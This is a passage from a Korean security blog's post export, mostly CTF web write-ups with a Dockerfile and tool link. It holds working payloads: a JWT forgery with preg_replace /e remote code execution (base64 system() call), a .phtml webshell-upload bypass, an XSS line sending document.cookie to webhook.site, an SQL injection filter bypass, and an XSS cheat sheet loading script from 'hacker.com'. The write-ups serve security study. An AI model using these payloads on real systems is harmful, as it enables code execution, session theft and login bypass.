신기하다. (잘 못보던 케이스) 암튼 파이썬으로 코딩해서 문제를 풀어주면 된다. import requests import threading cookie1 = &#123;&#39;PHPSESSID&#39;:&#39;bb11&#39;&#125; cookie2 = &#123;&#39;PHPSESSID&#39;:&#39;bb22&#39;&#125; def login(cookie): url = &quot;http://198.13.32.181:4345/login_check.php&quot; param = &#123;&#39;id&#39;:&#39;bb&#39;,&#39;pw&#39;:&#39;bb&#39;&#125; r = requests.post(url, data=param, cookies=cookie) print r.text def times(): global cookie1; url = &quot;http://198.13.32.181:4345/index.php?times=111111111111111111111111111111&quot; r = requests.get(url, cookies=cookie1) def flag(): global cookie2; url = &quot;http://198.13.32.181:4345/index.php?key=tatadadazazaabccocoheheaaaaaaaaaaaaa&quot; r = requests.get(url, cookies=cookie2) print r.text def main(): login(cookie1) login(cookie2) t1 = threading.Thread(target=times,args=()) t2 = threading.Thread(target=flag,args=()) t1.start() t2.start() main() Thank you (NGA) 2. (web) jpg viewer&lt;?php session_start(); require_once __DIR__ . &#39;/jwt.php&#39;; if(!isset($_COOKIE[&#39;PHPSESSJWT&#39;]))&#123; $token = $jwt-&gt;hashing(array( &#39;admin&#39; =&gt; false, &#39;iat&#39; =&gt; time(), )); setcookie(&#39;PHPSESSJWT&#39;, $token, time() + 86400 * 30); &#125; ?&gt; &lt;?php require_once __DIR__ . &#39;/jwt.php&#39;; $token = $_COOKIE[&#39;PHPSESSJWT&#39;]; if ($token) &#123; $body = $jwt-&gt;dehashing($token); &#125; if(isset($_GET[&#39;source&#39;]))&#123; echo highlight_file(__FILE__); exit; &#125; function imageanalyze($file)&#123; if(!is_file($file))&#123; echo &#39;&lt;script&gt;alert(&quot;Where is the File?&quot;)&lt;/script&gt;&#39;; exit; &#125; elseif(!exif_read_data($file))&#123; unlink($file); exit; &#125; else&#123; return exif_read_data($file); &#125; &#125; if(isset($_FILES[&#39;JPG&#39;]) &amp;&amp; $_FILES[&#39;JPG&#39;][&#39;name&#39;] != &quot;&quot;) &#123; $file = $_FILES[&#39;JPG&#39;]; $upload_directory = &#39;./uploads/&#39;; $ext_str = array(&quot;jpg&quot;); $max_file_size = 5242880; $ext = explode(&#39;.&#39;,$file[&#39;name&#39;]); $ext = strtolower(array_pop($ext)); if(!in_array($ext, $ext_str)) &#123; echo &quot;&lt;script&gt;alert(&#39;jpg파일만 업로드 할 수 있습니다.&#39;)&lt;/script&gt;&quot;; exit; &#125; if($file[&#39;size&#39;] &gt;= $max_file_size) &#123; echo &quot;&lt;script&gt;alert(&#39;파일은 5MB 까지만 업로드 가능합니다.&#39;)&lt;/script&gt;&quot;; exit; &#125; $path = $upload_directory.session_id(); $updir = $path.&#39;/&#39;.$file[&#39;name&#39;]; mkdir($path,0777); if(move_uploaded_file($file[&#39;tmp_name&#39;],$updir)) &#123; echo &quot;&lt;script&gt;alert(&#39;파일 업로드 성공!&#39;)&lt;/script&gt;&quot;; echo &quot;&lt;img src=&#39;$updir&#39;&gt;&quot;; $infor = imageanalyze($updir); &#125; else&#123; echo &quot;&lt;script&gt;alert(&#39;업로드 에러!&#39;)&lt;/script&gt;&quot;; exit; &#125; &#125; ?&gt; &lt;?php if(isset($infor))&#123; $Date = $infor[&#39;DateTimeOriginal&#39;]; $Model = $infor[&#39;Model&#39;]; $Make = $infor[&#39;Make&#39;]; $size = round($infor[&#39;FileSize&#39;]/1024,1); echo &quot;&lt;br&gt;파일명 : &#123;$infor[&#39;FileName&#39;]&#125;&lt;br&gt;&quot;; echo &quot;파일 크기 : &#123;$size&#125;KB&lt;br&gt;&quot;; if(array_key_exists(&#39;DateTimeOriginal&#39;,$infor))&#123; echo &quot;촬영 시간 : &#123;$Date&#125;&lt;br&gt;&quot;; &#125; else&#123; $date = date(&quot;Y-m-d H:i:s&quot;, $infor[&#39;FileDateTime&#39;]); echo &quot;업로드 시간 : &#123;$date&#125;&lt;br&gt;&quot;; &#125; if(array_key_exists(&#39;Model&#39;,$infor)&amp;&amp;isset($infor[&#39;Model&#39;]))&#123; echo &quot;카메라 모델 : &#123;$Model&#125;&lt;br&gt;&quot;; &#125; &#125; if($body[&#39;admin&#39;]==true)&#123; $edit = explode(&#39;.&#39;,$_COOKIE[&#39;edit&#39;]); preg_replace($$edit[0],$$edit[1],$$edit[2]); &#125; ?&gt; 이번에도 코드가 좀 길다, 한번 분석해보자. if($body[&#39;admin&#39;]==true)&#123; $edit = explode(&#39;.&#39;,$_COOKIE[&#39;edit&#39;]); preg_replace($$edit[0],$$edit[1],$$edit[2]); &#125; 이 부분에 보면 쿠키 값의 admin이 true를 가질 때, edit의 쿠키를 가지고 preg_replace 함수의 인자로 사용한다. 처음엔 좀 생각 했는데, 검색 하다가 우연히 preg_replace 함수에 대해 RCE 문서를 찾을 수 있었다. 그렇다 이 문제도 동일한 취약점을 사용하고 있다. $Date = $infor[&#39;DateTimeOriginal&#39;]; $Model = $infor[&#39;Model&#39;]; $Make = $infor[&#39;Make&#39;]; $size = round($infor[&#39;FileSize&#39;]/1024,1); 이 부분에서 업로드 하는 jpg 파일의 사진 정보 값을 담고 출력 해주니, $model, $make 에 공격 페이로드를 넣고 admin 쿠키를 조작 해 preg_replace 함수로 흘러가게 해주면 된다. 세션 조작은 문제에서 만들어주는 형태와 동일하게 새 jwt 세션을 만들어서 바꿔주면 된다. (아래 참고) &lt;?php require_once &quot;jwt.php&quot;; $jwt = new jwt(); $token = $jwt-&gt;hashing(array( ‘admin’=&gt;’true’, ‘iat’=&gt;time() )); var_dump($token); ?&gt; Model=/a/e &amp; Make=eval(base64_decode(‘c3lzdGVtKCRfR0VUWydjbWQnXSk7’));?cmd=ls &amp; ?cmd=/flag","categories":[{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/categories/CTF/"}],"tags":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/tags/Web/"}]},{"title":"ROP & SSE Instruction","slug":"rop-instruction-200210","date":"2020-02-09T15:00:00.000Z","updated":"2020-02-09T15:00:00.000Z","comments":true,"path":"2020/02/10/rop-instruction-200210/","link":"","permalink":"https://blog.jhyeon.dev/2020/02/10/rop-instruction-200210/","excerpt":"","text":"Linkhttps://www.notion.so/jhyeon/ROP-SSE-Instruction-ca573f7740ae4301ad61b455a140b659","categories":[{"name":"Pwnable","slug":"Pwnable","permalink":"https://blog.jhyeon.dev/categories/Pwnable/"}],"tags":[{"name":"ROP","slug":"ROP","permalink":"https://blog.jhyeon.dev/tags/ROP/"}]},{"title":"DIMICTF 2019 Write up","slug":"dimictf-200206","date":"2020-02-05T15:00:00.000Z","updated":"2020-02-05T15:00:00.000Z","comments":true,"path":"2020/02/06/dimictf-200206/","link":"","permalink":"https://blog.jhyeon.dev/2020/02/06/dimictf-200206/","excerpt":"","text":"1. web(5shared)&lt;?php require_once &#39;lib.php&#39;; session_start(); $session = md5(session_id()); $uploaddir = __DIR__ . &quot;/~uploads/&#123;$session&#125;/&quot;; createDirectory(__DIR__ . &quot;/~uploads/&quot;); createDirectory($uploaddir); //print_r($_FILES[&#39;file&#39;]); $file = $_FILES[&#39;file&#39;]; $uploadfile = $uploaddir . $file[&#39;name&#39;]; // sanity check $extension = explode(&#39;.&#39;, $file[&#39;name&#39;])[1]; if (!in_array($extension, Array(&quot;jpg&quot;, &quot;gif&quot;, &quot;png&quot;))) &#123; $message = &quot;&lt;script&gt;alert(&#39;jpg, gif, png 확장자만 업로드할 수 있습니다.&#39;); history.back(); &lt;/script&gt;&quot;; die($message); &#125; // the real sanity check $real_extension = array_pop(explode(&#39;.&#39;, $file[&#39;name&#39;])); if (preg_match(&quot;/php/i&quot;, $file[&#39;name&#39;])) &#123; $message = &quot;&lt;script&gt;alert(&#39;파일 이름에 php가 들어가면 안됩니다.&#39;); history.back(); &lt;/script&gt;&quot;; die($message); &#125; if ($file[&#39;size&#39;] &gt; 4096) &#123; $message = &quot;&lt;script&gt;alert(&#39;최대 4mb까지 업로드할 수 있습니다.&#39;); history.back(); &lt;/script&gt;&quot;; die($message); &#125; if (move_uploaded_file($file[&#39;tmp_name&#39;], $uploadfile)) &#123; $message = &quot;&lt;script&gt;alert(&#39;성공적으로 파일이 업로드되었습니다.&#39;); location.href = &#39;/&#39;; &lt;/script&gt;&quot;; echo $message; &#125; else &#123; $message = &quot;&lt;script&gt;alert(&#39;업로드 에러&#39;); history.back(); &lt;/script&gt;&quot;; echo $message; &#125; 코드가 좀 긴편인데 주요 부분들만 한번 확인 해보자, // sanity check $extension = explode(&#39;.&#39;, $file[&#39;name&#39;])[1]; if (!in_array($extension, Array(&quot;jpg&quot;, &quot;gif&quot;, &quot;png&quot;))) &#123; $message = &quot;&lt;script&gt;alert(&#39;jpg, gif, png 확장자만 업로드할 수 있습니다.&#39;); history.back(); &lt;/script&gt;&quot;; die($message); &#125; // the real sanity check $real_extension = array_pop(explode(&#39;.&#39;, $file[&#39;name&#39;])); if (preg_match(&quot;/php/i&quot;, $file[&#39;name&#39;])) &#123; $message = &quot;&lt;script&gt;alert(&#39;파일 이름에 php가 들어가면 안됩니다.&#39;); history.back(); &lt;/script&gt;&quot;; die($message); &#125; 웹쉘 업로드 문제이기 때문에 사실상 이 부분만 우회할 수 있다면 금방 풀 수 있다. sanity check 부분에 보면 argv[1] 로 오는 문자를 검사하는데,jpg, gif, png 만 허용시켜 둔 상황이다. 그런데 php에선 또 이상한 문제점이 우리를 반겨준다. 저렇게 검사할 경우에 다음과 같은 트릭을 사용할 수 있다. test.jpg test.jpg.phpjpg 뒤에 확장자를 하나 더 붙여서 실행 파일로 만들어 주면 확장자 검사를 피할 수 있다.근데 아래 real sanity check를 보면 php는 또 불가능 하기 때문에 php 대체 확장자를 써서 우회해주자. (phtml, php5 등) upload) test.jpg.phtml위와 같이 파일 명을 바꾸고, 웹 쉘을 업로드 시키면 된다. 2. (web) simple xss문제에 들어가면 게시판이 있는데 그냥 글쓰기 부분에서 xss payload 넣고,봇의 쿠키를 탈취하면 된다. location.href=&#39;https://webhook.site/~&#39;+document.cookie; 3. (web) simple sqli&lt;?php //error_reporting(E_ALL); //ini_set(&quot;display_errors&quot;, 1); require &#39;lib.php&#39;; if (isset($_GET[&#39;view-source&#39;]))&#123; highlight_file(__FILE__); exit; &#125; $id = $_POST[&#39;id&#39;]; $pw = $_POST[&#39;pw&#39;]; //var_dump($conn); if (preg_match(&quot;/information|admin|or|\\=| |\\#|\\&#39;|_|where/i&quot;, $id . $pw)) die(&quot;No Hack ~_~&quot;); if (isset($id, $pw)) &#123; $query = &quot;SELECT * FROM `users` WHERE `id` = trim(&#39;&#123;$id&#125;&#39;) AND `pw` = trim(&#39;&#123;$pw&#125;&#39;)&quot;; $result = mysqli_fetch_array(mysqli_query($conn, $query)); if ($result[&#39;id&#39;] === &#39;admin&#39;) echo &quot;&lt;h1&gt;&#123;$flag&#125;&lt;/h1&gt;&quot;; if ($result[&#39;id&#39;]) &#123; $message = &quot;&#123;$result[&#39;id&#39;]&#125;님 안녕하세요!&quot;; &#125; else &#123; $message = &quot;로그인에 실패하였습니다. 다시 시도해주세요.&quot;; &#125; &#125; ?&gt; 페이지 로그인 코드는 다음과 같다.$id, $pw 에 입력되는 값에서 information, admin, or 등 여러가지를 필터링 한다. 이 정규식 검증 부분들은 tab, like 문자를 통해서 쿼리문을 완성할 수 있다. id=\\&amp;pw=)|| id like &quot;ad&quot; &quot;min&quot;-- -","categories":[],"tags":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/tags/Web/"}]},{"title":"CTF Web Challenge(Dockerfile)","slug":"dockerfile-200205","date":"2020-02-04T15:00:00.000Z","updated":"2020-02-04T15:00:00.000Z","comments":true,"path":"2020/02/05/dockerfile-200205/","link":"","permalink":"https://blog.jhyeon.dev/2020/02/05/dockerfile-200205/","excerpt":"","text":"간단한 버전이라서 쓰는 사람에 맞게 적절히 수정하면 된다. FROM ubuntu:18.04 ENV DEBIAN_FRONTEND=noninteractive ENV TERM=linux RUN apt-get update -y RUN apt-get install apache2 -y RUN apt-get install libapache2-mod-php -y RUN apt-get install php -y RUN apt-get install vim -y COPY ./files /var/www/html RUN rm -rf /var/www/html/index.html EXPOSE 포트번호 CMD [&quot;/usr/sbin/apache2ctl&quot;, &quot;-D&quot;, &quot;FOREGROUND&quot;]","categories":[{"name":"Docx","slug":"Docx","permalink":"https://blog.jhyeon.dev/categories/Docx/"}],"tags":[{"name":"Docker","slug":"Docker","permalink":"https://blog.jhyeon.dev/tags/Docker/"},{"name":"Dockerfile","slug":"Dockerfile","permalink":"https://blog.jhyeon.dev/tags/Dockerfile/"}]},{"title":"libc database search(bluekat)","slug":"pwnbluekat-200205","date":"2020-02-04T15:00:00.000Z","updated":"2020-02-04T15:00:00.000Z","comments":true,"path":"2020/02/05/pwnbluekat-200205/","link":"","permalink":"https://blog.jhyeon.dev/2020/02/05/pwnbluekat-200205/","excerpt":"","text":"예전에 포너블 공부할 때 rop 문제에서 오프셋 기반으로립씨 버전 하나하나 찾으려니 솔직히 너무 귀찮았다.. 그래서 찾아보다가 libc bluekat 이라는 사이트를 찾았는데,함수 오프셋을 통해서 일치하는 libc 버전을 간단하게 찾아 주었다! 포너블 하신다면 자주 이용해먹으면 좋을 것 같다. [https://libc.blukat.me](libc-bluekat homepage)","categories":[{"name":"Pwnable","slug":"Pwnable","permalink":"https://blog.jhyeon.dev/categories/Pwnable/"}],"tags":[{"name":"Tools","slug":"Tools","permalink":"https://blog.jhyeon.dev/tags/Tools/"}]},{"title":"xss cheatsheet 2020","slug":"xsscheatsheet-200205","date":"2020-02-04T15:00:00.000Z","updated":"2020-02-04T15:00:00.000Z","comments":true,"path":"2020/02/05/xsscheatsheet-200205/","link":"","permalink":"https://blog.jhyeon.dev/2020/02/05/xsscheatsheet-200205/","excerpt":"","text":"&lt;script&gt;alert(1)&lt;/script&gt; &lt;Script&gt;alert(1)&lt;/Script&gt; &lt;svg onload=alert(1)&gt; &lt;img src=&quot;#&quot; onerror=alert(1)&gt; &lt;script src=&quot;hacker.com/hack.js&quot;&gt;&lt;/script&gt; &lt;a href=&quot;javascript:alert(1)&quot;&gt;cilck me&lt;/a&gt; &lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt; &lt;embed src=&quot;javascript:alert(1)&quot;&gt;&lt;/embed&gt; &lt;body onload=&quot;alert(1);&quot;&gt; &lt;body onunload=&quot;alert(1);&quot;&gt; &quot;&gt;&lt;svg onload=alert(1)&gt; &quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt; &lt;/style&gt;&lt;svg onload=alert(1)&gt; data:text/html,&lt;svg onload=alert(1)&gt; &lt;/script&gt;&lt;svg onload=alert(1)&gt; */alert(1)&lt;/script&gt;&lt;script&gt;/* constructor.constructor(&#39;alert(/xss/)&#39;)()&#125;&#125;","categories":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/categories/Web/"}],"tags":[{"name":"XSS","slug":"XSS","permalink":"https://blog.jhyeon.dev/tags/XSS/"},{"name":"CheatSheet","slug":"CheatSheet","permalink":"https://blog.jhyeon.dev/tags/CheatSheet/"}]}],"categories":[{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/categories/Web/"},{"name":"Memo","slug":"Memo","permalink":"https://blog.jhyeon.dev/categories/Memo/"},{"name":"Docx","slug":"Docx","permalink":"https://blog.jhyeon.dev/categories/Docx/"},{"name":"CTF","slug":"CTF","permalink":"https://blog.jhyeon.dev/categories/CTF/"},{"name":"Wargame","slug":"Wargame","permalink":"https://blog.jhyeon.dev/categories/Wargame/"},{"name":"Pwnable","slug":"Pwnable","permalink":"https://blog.jhyeon.dev/categories/Pwnable/"}],"tags":[{"name":"DVWA","slug":"DVWA","permalink":"https://blog.jhyeon.dev/tags/DVWA/"},{"name":"Pentesting","slug":"Pentesting","permalink":"https://blog.jhyeon.dev/tags/Pentesting/"},{"name":"Big Sur","slug":"Big-Sur","permalink":"https://blog.jhyeon.dev/tags/Big-Sur/"},{"name":"Mac OS","slug":"Mac-OS","permalink":"https://blog.jhyeon.dev/tags/Mac-OS/"},{"name":"Backup","slug":"Backup","permalink":"https://blog.jhyeon.dev/tags/Backup/"},{"name":"정보보안","slug":"정보보안","permalink":"https://blog.jhyeon.dev/tags/%EC%A0%95%EB%B3%B4%EB%B3%B4%EC%95%88/"},{"name":"최신동향","slug":"최신동향","permalink":"https://blog.jhyeon.dev/tags/%EC%B5%9C%EC%8B%A0%EB%8F%99%ED%96%A5/"},{"name":"Docker","slug":"Docker","permalink":"https://blog.jhyeon.dev/tags/Docker/"},{"name":"Ubuntu","slug":"Ubuntu","permalink":"https://blog.jhyeon.dev/tags/Ubuntu/"},{"name":"Suricata","slug":"Suricata","permalink":"https://blog.jhyeon.dev/tags/Suricata/"},{"name":"Network","slug":"Network","permalink":"https://blog.jhyeon.dev/tags/Network/"},{"name":"Linux","slug":"Linux","permalink":"https://blog.jhyeon.dev/tags/Linux/"},{"name":"Canary","slug":"Canary","permalink":"https://blog.jhyeon.dev/tags/Canary/"},{"name":"Memory Mitigation","slug":"Memory-Mitigation","permalink":"https://blog.jhyeon.dev/tags/Memory-Mitigation/"},{"name":"회고","slug":"회고","permalink":"https://blog.jhyeon.dev/tags/%ED%9A%8C%EA%B3%A0/"},{"name":"System","slug":"System","permalink":"https://blog.jhyeon.dev/tags/System/"},{"name":"OS","slug":"OS","permalink":"https://blog.jhyeon.dev/tags/OS/"},{"name":"syscall","slug":"syscall","permalink":"https://blog.jhyeon.dev/tags/syscall/"},{"name":"Web","slug":"Web","permalink":"https://blog.jhyeon.dev/tags/Web/"},{"name":"Web Hacking","slug":"Web-Hacking","permalink":"https://blog.jhyeon.dev/tags/Web-Hacking/"},{"name":"Pwnable","slug":"Pwnable","permalink":"https://blog.jhyeon.dev/tags/Pwnable/"},{"name":"ChristmasCTF2019","slug":"ChristmasCTF2019","permalink":"https://blog.jhyeon.dev/tags/ChristmasCTF2019/"},{"name":"BISC2020","slug":"BISC2020","permalink":"https://blog.jhyeon.dev/tags/BISC2020/"},{"name":"ROP","slug":"ROP","permalink":"https://blog.jhyeon.dev/tags/ROP/"},{"name":"POX2020","slug":"POX2020","permalink":"https://blog.jhyeon.dev/tags/POX2020/"},{"name":"NoSQL","slug":"NoSQL","permalink":"https://blog.jhyeon.dev/tags/NoSQL/"},{"name":"Cassandra","slug":"Cassandra","permalink":"https://blog.jhyeon.dev/tags/Cassandra/"},{"name":"DB","slug":"DB","permalink":"https://blog.jhyeon.dev/tags/DB/"},{"name":"Primary Key","slug":"Primary-Key","permalink":"https://blog.jhyeon.dev/tags/Primary-Key/"},{"name":"Foreign Key","slug":"Foreign-Key","permalink":"https://blog.jhyeon.dev/tags/Foreign-Key/"},{"name":"iftop","slug":"iftop","permalink":"https://blog.jhyeon.dev/tags/iftop/"},{"name":"CSAWCTF 2020","slug":"CSAWCTF-2020","permalink":"https://blog.jhyeon.dev/tags/CSAWCTF-2020/"},{"name":"PicoCTF2019","slug":"PicoCTF2019","permalink":"https://blog.jhyeon.dev/tags/PicoCTF2019/"},{"name":"C++","slug":"C","permalink":"https://blog.jhyeon.dev/tags/C/"},{"name":"STL","slug":"STL","permalink":"https://blog.jhyeon.dev/tags/STL/"},{"name":"Algorithm","slug":"Algorithm","permalink":"https://blog.jhyeon.dev/tags/Algorithm/"},{"name":"선형 탐색","slug":"선형-탐색","permalink":"https://blog.jhyeon.dev/tags/%EC%84%A0%ED%98%95-%ED%83%90%EC%83%89/"},{"name":"이진 탐색","slug":"이진-탐색","permalink":"https://blog.jhyeon.dev/tags/%EC%9D%B4%EC%A7%84-%ED%83%90%EC%83%89/"},{"name":"BOF","slug":"BOF","permalink":"https://blog.jhyeon.dev/tags/BOF/"},{"name":"CANVAS","slug":"CANVAS","permalink":"https://blog.jhyeon.dev/tags/CANVAS/"},{"name":"LMS","slug":"LMS","permalink":"https://blog.jhyeon.dev/tags/LMS/"},{"name":"B@ngsiri","slug":"B-ngsiri","permalink":"https://blog.jhyeon.dev/tags/B-ngsiri/"},{"name":"Python","slug":"Python","permalink":"https://blog.jhyeon.dev/tags/Python/"},{"name":"Development","slug":"Development","permalink":"https://blog.jhyeon.dev/tags/Development/"},{"name":"Wargame","slug":"Wargame","permalink":"https://blog.jhyeon.dev/tags/Wargame/"},{"name":"Browser Auditor","slug":"Browser-Auditor","permalink":"https://blog.jhyeon.dev/tags/Browser-Auditor/"},{"name":"XSS","slug":"XSS","permalink":"https://blog.jhyeon.dev/tags/XSS/"},{"name":"CSRF","slug":"CSRF","permalink":"https://blog.jhyeon.dev/tags/CSRF/"},{"name":"Chrome","slug":"Chrome","permalink":"https://blog.jhyeon.dev/tags/Chrome/"},{"name":"Firefox","slug":"Firefox","permalink":"https://blog.jhyeon.dev/tags/Firefox/"},{"name":"Malware","slug":"Malware","permalink":"https://blog.jhyeon.dev/tags/Malware/"},{"name":"Macro","slug":"Macro","permalink":"https://blog.jhyeon.dev/tags/Macro/"},{"name":"RCE","slug":"RCE","permalink":"https://blog.jhyeon.dev/tags/RCE/"},{"name":"PHP","slug":"PHP","permalink":"https://blog.jhyeon.dev/tags/PHP/"},{"name":"websec.fr","slug":"websec-fr","permalink":"https://blog.jhyeon.dev/tags/websec-fr/"},{"name":"Writeup","slug":"Writeup","permalink":"https://blog.jhyeon.dev/tags/Writeup/"},{"name":"BoB","slug":"BoB","permalink":"https://blog.jhyeon.dev/tags/BoB/"},{"name":"Dockerfile","slug":"Dockerfile","permalink":"https://blog.jhyeon.dev/tags/Dockerfile/"},{"name":"JWT","slug":"JWT","permalink":"https://blog.jhyeon.dev/tags/JWT/"},{"name":"Pwn","slug":"Pwn","permalink":"https://blog.jhyeon.dev/tags/Pwn/"},{"name":"Mprotect","slug":"Mprotect","permalink":"https://blog.jhyeon.dev/tags/Mprotect/"},{"name":"Shellcode","slug":"Shellcode","permalink":"https://blog.jhyeon.dev/tags/Shellcode/"},{"name":"Exploitation","slug":"Exploitation","permalink":"https://blog.jhyeon.dev/tags/Exploitation/"},{"name":"Tools","slug":"Tools","permalink":"https://blog.jhyeon.dev/tags/Tools/"},{"name":"CheatSheet","slug":"CheatSheet","permalink":"https://blog.jhyeon.dev/tags/CheatSheet/"}]}